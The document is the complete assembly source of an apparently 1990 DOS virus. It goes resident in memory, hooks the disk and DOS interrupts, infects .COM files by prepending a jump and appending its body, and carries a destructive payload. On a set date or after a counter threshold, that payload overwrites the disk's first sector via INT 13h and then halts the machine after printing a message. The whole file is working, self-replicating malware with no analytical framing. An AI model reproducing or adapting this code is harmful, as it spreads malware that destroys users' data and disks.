start:  jmp     short begin
	db	(00h)
	db	(53h)
	db	(4bh)
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)
begin:	push	cx
	CALL	F1
F1:	POP	SI
	SUB	SI,09
	mov	ax,0
	mov	ds,ax
	mov	word ptr [312h],si
	push	cs
	pop	ds
	push	cs
	pop	es
	cld
	mov	di,100h
	mov	cx,5
	rep	movsb
	jmp	ding2
int20h: mov	ah,00h
	jmp	mm
int21h: STI
        cmp     ah,00h
	jz	mm
	cmp	ah,4ch
	jz	mm
	cmp	ah,0ffh
	jz	mm
        jmp     int1hh
mm:	pushf
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	mov	ax,0
	mov	ds,ax
	cmp	byte ptr [302h],0
	jz	mm2
	mov	byte ptr [302h],0
	jmp	main
mm2:	mov	ah,19h
	int	21h
	mov	dl,al
	cmp	dl,01
	jna	mmm5
	add	dl,7Eh
	mov	ax,0
	mov	ds,ax
mmm5:	mov	byte ptr [309h],dl
	mov	byte ptr ch,[308h]
	mov	byte ptr dl,[309h]
	mov	cl,01
	push	cs
	pop	ds
        mov     ax,0201h
	mov	dh,00h
	mov	bx,offset end+7
	push	cs
	pop	es
	int	13h
	mov	ax,0
	mov	ds,ax
	mov	byte ptr ch,[308h]
	mov	byte ptr dl,[309h]
	mov	cl,01
	push	cs
	pop	ds
        mov     ax,0301h
	mov	dh,00h
	mov	bx,offset end+7
	push	cs
	pop	es
	int	13h
	jnc	etk6
	cmp	ah,3
	jnz	etk6
	jmp	main
etk6:	mov	ax,0
	mov	ds,ax
	mov	byte ptr [306h],1
	push	cs
	pop	ds
	mov	ah,2ah
	int	21h
	cmp	dl,21
	jnz	okef
	mov	ax,0309h
	mov	dx,0000h
	mov	cx,0001h
	lea	bx,[100h]
	int	13h
	jmp	short okep
okef:   mov     ax,0
	mov	ds,ax
	inc	word ptr [310h]
	cmp	Word ptr [310h],02FFh
	jnz	et3
okep:	push	cs
	pop	ds
	mov	bx,offset name
et9:	mov	ah,[bx]
	xor	ah,21
	mov	[bx],ah
	inc	bx
	cmp	bx,offset for1
	jnz	et9
        mov     ah,9
	mov	dx,offset name
	int	21h
	cli
	hlt
dinge:	jmp	ding
et3:	push	cs		;ds <- cs
	pop	ds
	mov	ah,2fh		;Dos service function ah=2FH (get DTA)
	int	21h		;ES:BX Addres of current DTA
	mov	[edta],ES
	mov	[bdta],BX
	mov	ah,1ah		;Dos service function ah=1AH (set DTA)
	mov	dx,offset end+7 ;DS:DX Addres of DTA
	int	21h
	push	cs
	pop	ds
        MOV     AH,4eH
        MOV     DX,offset files
	mov	cx,00
        INT     21H             ;Dos service function ah=4EH (FIND FIRST)
        jc      dinge           ;CX  File attribute
                                ;DS:DX Pointer of filespec (ASCIIZ string)
vir:	mov	ax,3d02h
	push	cs
	pop	ds
	mov	dx,offset end+7 ;DS:DX Addres of DTA
	add	dx,1EH
	int	21h		;Dos service function ah=3DH (OPEN FILE)
                                ;AL Open mode
                                ;DS:DX Pointer to filename (ASCIIZ string)
                                ;Return AX file handle
        mov     [handle],ax
	mov	ah,'C'
	mov	al,'D'
        PUSH    DX
        POP     BX
	cmp	[bx],ah ;Compare filename for 'COMMAND.COM'
	jnz	p1		;If not first char 'C' then push virus in file
	cmp	[bx+6],al
	jz	v		;If 7 char 'D' then find next file
p1:     mov     bx,handle
        push    cs
	pop	ds
	mov	ah,3fh
	mov	dx,offset end
	mov	cx,5
	int	21h		;Dos service function ah=3FH (READ FILE)
                                ;BX File handle
                                ;CX Number of bytes to read
                                ;DS:DX Addres of buffer
	push	cs
	pop	es		;ES <- CS
	cld
        PUSH    DX
        POP     SI
	mov	di,offset okey
	mov	cx,5
	rep	movsb		;Repeat While CX>0 do ES:DI <- DS:SI
                                ;                     SI=SI+1
                                ;                     DI=DI+1
	mov	ax,534bh
	mov	di,dx
	add	di,3
	cmp	[di],ah
	jnz	fuck
	inc	di
	cmp	[di],al
	jnz	fuck
v:	push	cs
	pop	ds
	mov	bx,handle
	mov	ah,3eh
	int	21h
	push	cs
	pop	ds
	mov	ah,4fh
	int	21h
	jc	enzi
	jmp	short vir
enzi:	jmp	ding
fuck:   mov     ax,offset end+7
	add	ax,1aH
	mov	di,ax
        Mov     Word Ptr cx,[di]
        mov     ax,offset end
	mov	di,ax
	mov	al,0e9h
	cmp	cx,1a0h
	jna	v
	add	cx,2
	mov	[di],al
	inc	di
	mov	Word Ptr [di],cx
	mov	ax,534bh
	add	di,2
	mov	[di],ah
	inc	di
	mov	[di],al
        mov     bx,[handle]    ;
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	push	cs
	pop	ds
	int	21h
	mov	bx,handle
	mov	ah,40h
	mov	dx,offset end
	mov	cx,5
	int	21h
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	push	cs
	pop	ds
	mov	bx,handle
	mov	ah,40h
	mov	dx,offset okey
	mov	cx,end-okey
	int	21h
	mov	bx,handle
        mov     ah,3eh
	int	21h
	mov	ax,0000
	mov	ds,ax
	inc	Word ptr [0310h]
ding:	push	cs
	pop	ds
	mov	ah,1ah
	mov	ds,[edta]
	mov	dx,[bdta]
	int	21h
	mov	ax,0
	mov	ds,ax
	mov	byte ptr [306h],0
main:	PUSH	CS
	POP	DS
	POP	DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	popf
int1hh	nop
int1h:  db      (0eah)
is:	dw	0
io:	dw	0

int13h: cli
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	push	ax
	mov	ax,0
	mov	ds,ax
	pop	ax
	mov	byte ptr [308h],ch
	mov	byte ptr [309h],dl
	push	cs
	pop	ds
	push	ax
	push	ds
	cmp	ah,03
	jz	etk2
	cmp	ah,05
	jnz	etk3
etk2:	mov	ax,0000
	mov	ds,ax
	inc	Word ptr [310h]
	cmp	Word ptr [310h],02FEh
	jnz	etk3
	push	cs
	pop	ds
	STI
	int	20h
etk3:	pop	ds
        pop     ax
	STI
        int     65h
	pushf
	push	ax
	mov	ax,0
	mov	ds,ax
	cmp	byte ptr [306h],0
	pop	ax
	jz	etk4
	popf
        clc
	mov	ax,0
	jmp	short etk5
etk4:   popf
etk5:   POP     DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	db	(0CAH)
	db	(02)
	db	(00)
name:	db	'Virus in memory !!! Created by 21.I.1990 - PMG\OTME - Tolbuhin ...$'
for1:	jmp	ding1
files:	db	'*.com',0
ding2:	mov	ax,0000h
	mov	ds,ax
        MOV     BX,300H
	MOV	CX,4b53h
	cmp	[bx],cx
	jz	for1
        mov     [bx],cx
        mov     ah,62h
	int	21h
	mov	ds,bx
	mov	bx,[2ch]
	dec	bx
	mov	dx,0FFFFh
loc_1:	mov	ds,bx
	mov	di,[3]
	inc	di
	add	dx,di
	add	bx,di
	cmp	byte ptr [0000],5Ah
	jne	loc_1
	mov	cx,es
	add	cx,dx
	sub	word ptr [3],80h
	sub	cx,80h
	sub	cx,10h
	mov	es,cx
	mov	di,100h
	cld
        mov     ax,0000h
        mov     ds,ax
        mov     bx,[004ch]
        mov     [0194h],bx
        mov     cx,[004eh]
        mov     [0196h],cx
	mov	ax,0
	mov	ds,ax
lenf	equ	word ptr ds:[312h]
        mov     ax,0000h
	mov	ds,ax
	mov	bx,[0084h]
	mov	cx,[0086h]
	mov	ax,0
	mov	ds,ax
        mov     di,is-okey
        add     di,lenf
	push	cs
	pop	ds
	mov	[di],bx
	mov	[di+2],cx
	mov	ax,0
	mov	ds,ax
	mov	si,[312h]
	sub	si,7
	push	cs
	pop	ds
	mov	di,100h
	mov	cx,800h
	rep	movsb
	mov	ax,0000
	mov	ds,ax
	cli
	mov	WORD PTR [0086h],ES
        mov     WORD PTR [004eh],ES
	mov	word ptr [0082h],es
	mov	di,int20h-okey
	add	di,107h
        mov     WORD PTR [0080h],di
	mov	di,int13h-okey
	add	di,107h
        mov     WORD PTR [004ch],di
	mov	di,int21h-okey
	add	di,107h
	mov	WORD PTR [0084h],di
	sti
Ding1:	mov	ax,0
	mov	ds,ax
	mov	byte ptr [306h],1
	mov	byte ptr [302h],0
	mov	ah,19h
	int	21h
	mov	dl,al
	cmp	dl,01
	jna	mmm
	add	dl,7Eh
mmm:	mov	byte ptr [309h],dl
	push	cs
	pop	ds
	mov	ah,0ffh
	int	21h
for:	mov	ax,0
	mov	ds,ax
	mov	byte ptr [306h],0
	mov	byte ptr [302h],1
	PUSH	CS
	POP	DS
	pop	cx
	mov	si,100h
	jmp	si
handle: dw	?
edta:	dw	?
bdta:	dw	?
com:	db	'COMMAND'
end:    db      (00)